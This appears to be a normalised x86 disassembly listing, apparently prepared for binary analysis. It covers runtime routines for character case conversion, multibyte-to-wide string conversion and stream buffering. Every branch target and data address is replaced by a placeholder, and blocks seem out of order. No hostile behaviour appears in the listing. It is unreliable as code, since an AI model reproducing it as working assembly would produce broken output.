mov edx 0xffff
mov [ ebp - 0x4 ] eax
cmp cx dx
je r-xdata
leave
retn
mov edx [ ebp + 0xc ]
push esi
mov esi [ edx ]
mov edx 0x100
test esi esi
jne r-xdata
push 0x1
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push edx
push esi
call sub_43dbb4
add esp 0x18
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
push edi
pop edi
cmp cx dx
jae r-xdata
pop esi
mov eax [ ebp - 0x4 ]
lea edx [ ecx - 0x41 ]
cmp dx 0x19
ja r-xdata
add cx 0x20
movzx eax cx
jmp r-xdata
sub_436275
mov edi edi
push ebp
mov ebp esp
push ecx
mov cx [ ebp + 0x8 ]
movzx eax cx
mov edx 0xffff
mov [ ebp - 0x4 ] eax
cmp cx dx
je r-xdata
leave
retn
mov edx [ ebp + 0xc ]
mov edx [ edx ]
test edx edx
jne r-xdata
push 0x1
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push 0x200
push edx
call sub_43dbb4
add esp 0x18
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
push esi
mov esi 0x100
cmp cx si
pop esi
jae r-xdata
mov eax [ ebp - 0x4 ]
lea edx [ ecx - 0x61 ]
cmp dx 0x19
ja r-xdata
sub cx 0x20
movzx eax cx
leave
retn
sub_4362dd
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0xa
push 0x1f
lea eax [ ebp - 0x23 ]
push eax
push 0x0
push [ ebp + 0x8 ]
mov [ ebp - 0x24 ] 0x2e
call sub_43ddb3
lea eax [ ebp - 0x24 ]
push eax
push 0x0
call sub_439f05
mov ecx [ ebp - 0x4 ]
xor ecx ebp
add esp 0x1c
call sub_437c1c
leave
retn
sub_43631f
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
push 0x3e
xor edx edx
pop ecx
div ecx
xor esi esi
lea eax [ edx * 4 + rw-data ]
mov [ ebp - 0x4 ] eax
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
cmp eax [ ebp + 0x8 ]
je r-xdata
push edi
push esi
push [ ebp - 0x4 ]
mov [ esi ] edi
call [ InterlockedCompareExchange@IAT ]
cmp eax edi
jne r-xdata
push 0xc
call sub_43ddd2
mov esi eax
pop ecx
test esi esi
je r-xdata
test esi esi
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
mov ebx edi
test edi edi
je r-xdata
mov eax [ esi + 0x8 ]
xor eax eax
jmp r-xdata
mov ebx [ ebp + 0x8 ]
push ebx
call sub_4362dd
pop ecx
mov [ esi + 0x8 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
jmp r-xdata
push [ esi + 0x8 ]
call sub_43939c
push esi
call sub_4381f8
pop ecx
pop ecx
pop edi
pop esi
pop ebx
leave
retn
push esi
call sub_4381f8
pop ecx
mov [ esi + 0x4 ] ebx
sub_4363ba
mov edi edi
push ebx
push esi
push edi
mov ebx rw-data
add ebx 0x4
cmp ebx rw-data
jl r-xdata
push [ esi + 0x8 ]
mov edi [ esi ]
call sub_43939c
push esi
call sub_4381f8
pop ecx
pop ecx
mov esi edi
test edi edi
jne r-xdata
push 0x0
push ebx
call [ InterlockedExchange@IAT ]
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_43640d
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ edi ] 0x0
jne r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov esi [ eax ]
mov eax [ eax + 0x4 ]
call sub_43c803
mov esi [ eax + 0x8 ]
call sub_43c7dd
jmp r-xdata
xor ecx ecx
mov [ eax ] cx
push [ ebp + 0xc ]
call sub_43631f
mov esi [ ebp + 0x14 ]
cmp [ esi ] 0x0
pop ecx
mov ebx eax
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov [ ebp + 0xc ] eax
test esi esi
jne r-xdata
test ebx ebx
jne r-xdata
mov al [ edi ]
push ebx
mov [ esi + 0x1 ] al
call sub_43c7c1
pop ecx
cmp eax 0x1
jle r-xdata
xor eax eax
inc eax
jmp r-xdata
movzx ecx [ edi ]
mov [ eax ] cx
movzx eax [ edi ]
mov ecx [ ebx + 0x4 ]
movzx eax [ ecx + eax + 0x1d ]
and eax 0x4
call sub_43df03
movzx ecx [ edi ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
jmp r-xdata
and [ esi ] 0x0
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
push eax
push [ ebp + 0x8 ]
push 0x2
push esi
push 0x9
push [ ebp + 0xc ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
push eax
push [ ebp + 0x8 ]
push 0x1
push edi
push 0x9
push [ ebp + 0xc ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_43c7c1
pop ecx
cmp [ ebp + 0x10 ] eax
jae r-xdata
test eax eax
je r-xdata
and [ esi ] 0x0
jmp r-xdata
push ebx
call sub_43c7c1
pop ecx
cmp eax 0x1
jle r-xdata
mov al [ edi ]
push 0xfffffffe
mov [ esi ] al
pop eax
jmp r-xdata
call sub_43c04c
mov [ eax ] 0x2a
or eax 0xffffffff
jmp r-xdata
cmp [ edi + 0x1 ] 0x0
jne r-xdata
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
push eax
push [ ebp + 0x8 ]
push ebx
call sub_43c7c1
pop ecx
push eax
push edi
push 0x9
push [ ebp + 0xc ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_43c7c1
pop ecx
jmp r-xdata
jmp r-xdata
sub_436580
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
mov eax [ esi ]
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x4 ]
call sub_43c803
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
call sub_43c7dd
jmp r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
push edi
mov edi 0x100
cmp ebx edi
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
cmp [ ebp - 0xc ] 0x0
mov [ ebp - 0x10 ] eax
jne r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
pop esi
leave
retn
add eax 0x20
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
mov eax [ ebp - 0x8 ]
and eax 0xff
movsx eax [ ecx + eax * 2 ]
shr eax 0xf
and eax 0x1
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
call sub_43df03
movzx ecx [ ebp - 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
jmp r-xdata
mov eax [ esi + 0x8 ]
test [ eax + ebx * 2 ] 0x1
je r-xdata
push ebx
call sub_43ae16
pop ecx
test eax eax
jne r-xdata
xor eax eax
mov [ ebp + 0xc ] bl
mov [ ebp + 0xd ] 0x0
inc eax
mov al [ ebp - 0x8 ]
push 0x2
mov [ ebp + 0xc ] al
mov [ ebp + 0xd ] bl
mov [ ebp + 0xe ] 0x0
pop eax
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
jmp r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x4 ]
je r-xdata
push 0x1
push [ ebp - 0x10 ]
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
push [ ebp - 0xc ]
push 0x0
call sub_43e133
add esp 0x24
test eax eax
jne r-xdata
pop edi
pop ebx
movzx ecx [ ebp - 0x3 ]
shl eax 0x8
or eax ecx
sub_43668d
mov edi edi
push ebp
mov ebp esp
push esi
call sub_43c803
mov eax [ eax + 0x4 ]
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_43c7dd
push 0x2
push 0x100
mov [ esi + 0x4 ] eax
call sub_43de17
pop ecx
pop ecx
mov [ esi + 0x8 ] eax
test eax eax
je r-xdata
call sub_43df03
and [ esi + 0xc ] 0x0
mov [ esi + 0x8 ] eax
push 0x200
call sub_43df03
push eax
push [ esi + 0x8 ]
call sub_43a8a0
add esp 0xc
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov eax esi
pop esi
pop ebp
retn
sub_4366ed
mov edi edi
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push 0x1
call [ GetStringTypeW@IAT ]
movsx ecx [ ebp - 0x4 ]
neg eax
sbb eax eax
and eax ecx
leave
retn
sub_436711
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push [ ebp + 0x10 ]
sub eax [ ebp + 0x8 ]
sar eax 0x1
push eax
push [ ebp + 0x8 ]
push 0x1
call [ GetStringTypeW@IAT ]
mov eax [ ebp + 0xc ]
pop ebp
retn
sub_436732
mov edx [ rw-data ]
push esi
mov esi rw-data
mov eax ecx
mov [ rw-data ] esi
test edx edx
je r-xdata
mov edx [ rw-data ]
test edx edx
je r-xdata
mov ecx [ edx ]
mov ecx [ ecx + 0x4 ]
mov [ ecx + edx + 0x3c ] esi
mov edx [ rw-data ]
test edx edx
je r-xdata
mov ecx [ edx ]
mov ecx [ ecx + 0x4 ]
mov esi [ rw-data ]
mov [ ecx + edx + 0x3c ] esi
pop esi
retn
mov ecx [ edx ]
mov ecx [ ecx + 0x4 ]
mov esi [ rw-data ]
mov [ ecx + edx + 0x3c ] esi
sub_436787
mov edx [ ecx + 0x10 ]
lea eax [ ecx + 0x48 ]
cmp [ edx ] eax
jne r-xdata
retn
mov eax [ ecx + 0x40 ]
push esi
mov esi [ ecx + 0x3c ]
mov [ edx ] esi
mov edx [ ecx + 0x20 ]
mov [ edx ] eax
mov ecx [ ecx + 0x30 ]
sub eax eax
sar eax 0x1
mov [ ecx ] eax
pop esi
sub_4367aa
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_4047b0
mov ecx esi
mov [ esi ] r--data
mov [ esi + 0x50 ] 0x0
mov [ esi + 0x4a ] 0x0
call sub_4049c0
mov eax [ ebp + 0x8 ]
mov [ esi + 0x54 ] eax
mov eax [ rw-data ]
and [ esi + 0x44 ] 0x0
mov [ esi + 0x4c ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
sub_4367e9
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
call sub_43e324
movzx eax ax
pop ecx
mov ecx 0xffff
cmp ax cx
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx ] ax
mov al 0x1
pop ebp
retn
xor al al
pop ebp
retn
sub_436812
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43e516
pop ecx
pop ecx
mov ecx 0xffff
xor edx edx
cmp ax cx
setne al
pop ebp
retn
sub_436833
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
push [ ebp + 0xc ]
push eax
call sub_43e740
pop ecx
pop ecx
mov ecx 0xffff
xor edx edx
cmp ax cx
setne al
pop ebp
retn
sub_436876
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x54 ] 0x0
je r-xdata
xor eax eax
pop esi
retn
mov eax [ esi ]
push edi
mov edi 0xffff
push edi
call [ eax + 0xc ]
cmp di ax
pop edi
je r-xdata
push [ esi + 0x54 ]
call sub_43bda3
pop ecx
test eax eax
jns r-xdata
or eax 0xffffffff
pop esi
retn
sub_4368a9
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x14 ]
mov [ esi ] eax
mov eax [ ebp + 0x18 ]
push edi
mov edi [ ebp + 0x20 ]
mov [ ebp - 0x4 ] ecx
xor ecx ecx
mov [ edi ] eax
mov eax [ esi ]
cmp eax ebx
setne cl
mov [ ebp + 0x14 ] ecx
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ edi ]
cmp ecx [ ebp + 0x1c ]
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ esi ]
add edx 0x8
push edx
push [ ebp + 0x8 ]
mov edx ebx
sub edx eax
push edx
push eax
push ecx
call sub_43640d
add esp 0x14
cmp eax 0xfffffffe
je r-xdata
mov [ esi ] ebx
cmp eax 0xffffffff
je r-xdata
push 0x2
pop eax
jmp r-xdata
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x1c
cmp eax 0xfffffffd
jne r-xdata
mov ecx [ edi ]
cmp [ ecx ] ax
jne r-xdata
add [ esi ] eax
add [ edi ] 0x2
and [ ebp + 0x14 ] 0x0
cmp [ esi ] ebx
jne r-xdata
xor eax eax
push [ esi ]
call sub_43c860
pop ecx
inc eax
jmp r-xdata
sub_43693f
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x14 ]
mov [ esi ] eax
mov eax [ ebp + 0x18 ]
push edi
mov edi [ ebp + 0x20 ]
mov [ ebp - 0x18 ] ecx
xor ecx ecx
mov [ edi ] eax
mov eax [ esi ]
cmp eax [ ebp + 0x10 ]
mov [ ebp - 0x1c ] ebx
setne cl
mov [ ebp - 0x14 ] ecx
cmp eax [ ebp + 0x10 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ ebp + 0x1c ]
cmp [ edi ] eax
je r-xdata
mov eax [ edi ]
mov [ ebp - 0x10 ] eax
call sub_43c798
mov ecx [ ebp + 0x1c ]
sub ecx [ ebp - 0x10 ]
cmp eax ecx
jg r-xdata
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x18 ]
add eax 0x8
push eax
mov eax [ esi ]
movzx eax [ eax ]
push ebx
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_435b3f
mov ebx eax
add esp 0x10
test ebx ebx
js r-xdata
mov eax [ ebp - 0x18 ]
add eax 0x8
push eax
mov eax [ esi ]
movzx eax [ eax ]
push ebx
push eax
push [ ebp - 0x10 ]
call sub_435b3f
add esp 0x10
test eax eax
js r-xdata
push 0x2
pop eax
jmp r-xdata
mov eax [ edi ]
mov ecx [ ebp + 0x1c ]
sub ecx eax
cmp ecx ebx
jl r-xdata
add [ esi ] 0x2
add [ edi ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_437c1c
leave
retn 0x1c
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x1c ]
mov [ ecx ] eax
push ebx
lea ecx [ ebp - 0xc ]
push ecx
push eax
call sub_43a8a0
add [ esi ] 0x2
add esp 0xc
add [ edi ] ebx
mov ebx [ ebp - 0x1c ]
mov eax [ ebp + 0x10 ]
and [ ebp - 0x14 ] 0x0
cmp [ esi ] eax
jne r-xdata
jmp r-xdata
sub_436a3e
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x10 ] 0x0
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax ecx
mov ecx [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
add eax 0x8
push eax
push edi
mov [ esi ] ecx
mov ecx [ edi ]
lea eax [ ebp - 0xc ]
push 0x0
push eax
mov [ ebp - 0x14 ] ecx
call sub_435b3f
mov ebx eax
add esp 0x10
test ebx ebx
jg r-xdata
mov eax [ esi ]
mov ecx [ ebp + 0x10 ]
dec ebx
sub ecx eax
cmp ecx ebx
jge r-xdata
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x14 ]
mov [ edi ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_437c1c
leave
retn 0x10
push ebx
lea ecx [ ebp - 0xc ]
push ecx
push eax
call sub_43a8a0
add esp 0xc
add [ esi ] ebx
sub_436acd
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi ecx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x14 ] ebx
jbe r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
leave
retn 0x10
cmp esi [ ebp + 0x10 ]
je r-xdata
lea eax [ edi + 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x10 ]
sub eax esi
push eax
lea eax [ ebp + 0x8 ]
push esi
push eax
call sub_43640d
add esp 0x14
cmp eax 0xfffffffe
je r-xdata
cmp eax 0xffffffff
je r-xdata
test eax eax
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
cmp [ ebp + 0x8 ] ax
jne r-xdata
add esi eax
inc ebx
cmp ebx [ ebp + 0x14 ]
jb r-xdata
xor eax eax
push esi
call sub_43c860
pop ecx
inc eax
sub_436b45
mov edi edi
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_43811c
pop ecx
sub_436b67
mov edi edi
push esi
mov esi ecx
mov eax [ esi + 0x20 ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x1c ]
movzx edi ax
mov eax 0xffff
cmp ax di
je r-xdata
mov edx [ esi + 0x30 ]
mov edx [ edx ]
mov eax ecx
lea edx [ eax + edx * 2 ]
cmp eax edx
jae r-xdata
pop edi
pop esi
retn
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x10 ]
mov ax di
mov ax [ ecx ]
pop esi
retn
sub_436bab
mov edx [ ecx + 0x10 ]
push esi
mov esi [ edx ]
lea eax [ ecx + 0x48 ]
cmp esi eax
je r-xdata
mov [ edx ] eax
mov edx [ ecx + 0x20 ]
mov [ edx ] eax
mov edx ecx
sub edx eax
mov eax [ ecx + 0x30 ]
add edx 0x4a
sar edx 0x1
mov [ eax ] edx
pop esi
retn
mov [ ecx + 0x3c ] esi
mov esi [ ecx + 0x30 ]
mov esi [ esi ]
push edi
mov edi [ ecx + 0x20 ]
mov edi [ edi ]
lea esi [ edi + esi * 2 ]
mov [ ecx + 0x40 ] esi
pop edi
sub_436be4
push 0x28
mov eax sub_450f1b
call sub_43cccf
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x2
pop eax
call sub_43cd6e
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_438178
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_4026b0
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_402600
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_435bc6
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_436c6e
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x20 ]
mov eax [ eax ]
push edi
mov di [ ebp + 0x8 ]
mov ebx 0xffff
test eax eax
je r-xdata
mov eax [ esi + 0x54 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x10 ]
cmp [ ecx ] eax
jae r-xdata
mov eax ebx
cmp bx di
je r-xdata
cmp bx di
je r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
mov eax [ esi + 0x30 ]
inc [ eax ]
mov esi [ esi + 0x20 ]
add [ esi ] 0xfffffffe
cmp di bx
je r-xdata
cmp [ eax - 0x2 ] di
jne r-xdata
mov ecx [ esi + 0x20 ]
lea eax [ esi + 0x48 ]
cmp [ ecx ] eax
je r-xdata
push eax
movzx ecx di
lea eax [ ebp + 0x8 ]
push eax
mov [ ebp + 0x8 ] ecx
call sub_436833
pop ecx
pop ecx
test al al
je r-xdata
xor eax eax
jmp r-xdata
movzx eax di
jmp r-xdata
mov ecx esi
mov [ eax ] di
call sub_436bab
jmp r-xdata
mov ax di
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_436d01
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
push edi
mov edi ecx
mov ecx esi
call [ eax + 0x4 ]
test al al
je r-xdata
mov ecx edi
mov [ edi + 0x44 ] esi
call sub_4049c0
and [ edi + 0x44 ] 0x0
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x4
sub_436d2e
push 0x14
mov eax sub_450f3e
call sub_43cccf
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_436188
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_402780
mov ecx [ ebp + 0x8 ]
push eax
call sub_402890
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_4361b0
mov eax edi
call sub_43cd6e
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_436be4
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_4027c0
push edi
call sub_435de7
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_437d0f
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_43c3a5
sub_436dcb
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x54 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ ebp + 0x8 ] 0x0
mov eax [ ebp + 0xc ]
jne r-xdata
xor edx edx
mov edx eax
or edx [ ebp + 0x10 ]
jne r-xdata
push edi
mov edi [ esi + 0x54 ]
mov ecx esi
mov [ esi + 0x50 ] 0x1
mov [ esi + 0x4a ] al
call sub_4049c0
mov [ esi + 0x54 ] edi
mov eax [ rw-data ]
and [ esi + 0x44 ] 0x0
mov [ esi + 0x4c ] eax
mov eax esi
pop edi
jmp r-xdata
push 0x4
pop edx
jmp r-xdata
pop esi
pop ebp
retn 0xc
add eax eax
push eax
push edx
push [ ebp + 0x8 ]
push ecx
call sub_43e7af
add esp 0x10
test eax eax
jne r-xdata
sub_436e32
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_436d2e
pop ecx
push eax
mov ecx esi
call sub_436d01
pop esi
pop ebp
retn 0x4
sub_436e50
push 0x2c
mov eax sub_450f61
call sub_43cd38
mov esi ecx
mov eax [ esi + 0x20 ]
mov eax [ eax ]
xor ebx ebx
cmp eax ebx
je r-xdata
cmp [ esi + 0x54 ] ebx
je r-xdata
mov eax [ esi + 0x20 ]
mov ecx [ esi + 0x30 ]
mov eax [ eax ]
mov ecx [ ecx ]
lea ecx [ eax + ecx * 2 ]
cmp eax ecx
jae r-xdata
mov eax 0xffff
mov ecx esi
call sub_436787
cmp [ esi + 0x44 ] ebx
jne r-xdata
mov eax [ esi + 0x30 ]
dec [ eax ]
mov esi [ esi + 0x20 ]
mov eax [ esi ]
lea ecx [ eax + 0x2 ]
mov [ esi ] ecx
mov ax [ eax ]
jmp r-xdata
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
mov [ ebp - 0x4 ] ebx
jmp r-xdata
push [ esi + 0x54 ]
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x34 ] ebx
call sub_4367e9
pop ecx
test al al
movzx eax [ ebp - 0x34 ]
pop ecx
jne r-xdata
call sub_43cd82
retn
push [ esi + 0x54 ]
call sub_43e9f1
pop ecx
lea ecx [ ebp - 0x2c ]
cmp eax 0xffffffff
jne r-xdata
jmp r-xdata
push eax
push 0x1
call sub_409a90
cmp [ ebp - 0x18 ] 0x10
mov edx [ ebp - 0x2c ]
mov eax edx
jae r-xdata
jmp r-xdata
add eax [ ebp - 0x1c ]
mov ecx [ esi + 0x44 ]
mov edi [ ecx ]
lea ebx [ ebp - 0x38 ]
push ebx
lea ebx [ ebp - 0x2e ]
push ebx
lea ebx [ ebp - 0x30 ]
push ebx
lea ebx [ ebp - 0x34 ]
push ebx
push eax
push edx
lea eax [ esi + 0x4c ]
push eax
call [ edi + 0x10 ]
xor ebx ebx
cmp eax ebx
jl r-xdata
lea eax [ ebp - 0x2c ]
mov edx eax
push ebx
push 0x1
call sub_405da0
lea ecx [ ebp - 0x2c ]
cmp eax 0x1
jle r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x38 ] eax
mov eax [ ebp - 0x2c ]
jne r-xdata
cmp eax 0x3
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
jae r-xdata
cmp [ ebp - 0x1c ] 0x2
jb r-xdata
sub eax [ ebp - 0x34 ]
add eax [ ebp - 0x1c ]
mov edi eax
jmp r-xdata
lea eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x34 ]
sub ecx eax
push ecx
push ebx
lea ecx [ ebp - 0x2c ]
call sub_405e70
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp edi ebx
jg r-xdata
push 0x2
push eax
lea eax [ ebp - 0x30 ]
push 0x2
push eax
call sub_438acf
add esp 0x10
jmp r-xdata
lea eax [ ebp - 0x2c ]
mov eax [ ebp - 0x34 ]
push [ esi + 0x54 ]
dec edi
movsx eax [ edi + eax ]
push eax
call sub_43e988
pop ecx
pop ecx
movzx esi [ ebp - 0x30 ]
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_405da0
mov ax si
jmp r-xdata
sub_436fe1
push 0x24
mov eax sub_450f8e
call sub_43cd38
mov esi ecx
xor ebx ebx
cmp [ esi + 0x44 ] ebx
je r-xdata
mov al 0x1
cmp [ esi + 0x4a ] bl
je r-xdata
mov eax [ esi ]
mov edi 0xffff
push edi
call [ eax + 0xc ]
movzx eax ax
cmp di ax
jne r-xdata
push ebx
push 0x8
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
call sub_41ed20
mov [ ebp - 0x4 ] ebx
xor al al
jmp r-xdata
mov edx [ ebp - 0x2c ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
mov edx eax
call sub_43cd82
retn
mov ecx [ esi + 0x44 ]
mov edi [ ecx ]
lea ebx [ ebp - 0x30 ]
push ebx
mov ebx [ ebp - 0x1c ]
add eax ebx
push eax
push edx
lea eax [ esi + 0x4c ]
push eax
call [ edi + 0x18 ]
sub eax 0x0
je r-xdata
mov [ esi + 0x4a ] 0x0
dec eax
je r-xdata
mov edi [ ebp - 0x30 ]
sub edi eax
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
dec eax
dec eax
je r-xdata
cmp [ esi + 0x4a ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov bl 0x1
jmp r-xdata
xor bl bl
test edi edi
jne r-xdata
push [ esi + 0x54 ]
push edi
push 0x1
push eax
call sub_43bb9f
add esp 0x10
cmp edi eax
jne r-xdata
lea eax [ ebp - 0x2c ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_405da0
mov al bl
jmp r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
push edi
push 0x8
lea ecx [ ebp - 0x2c ]
call sub_409a90
jmp r-xdata
sub_4370e0
push 0x2c
mov eax sub_450f61
call sub_43cd38
mov edi [ ebp + 0x8 ]
mov eax 0xffff
mov esi ecx
cmp ax di
jne r-xdata
mov eax [ esi + 0x24 ]
mov ecx [ eax ]
xor ebx ebx
cmp ecx ebx
je r-xdata
xor eax eax
jmp r-xdata
cmp [ esi + 0x54 ] ebx
je r-xdata
mov eax [ esi + 0x34 ]
mov edx [ eax ]
lea edx [ ecx + edx * 2 ]
cmp ecx edx
jae r-xdata
call sub_43cd82
retn 0x4
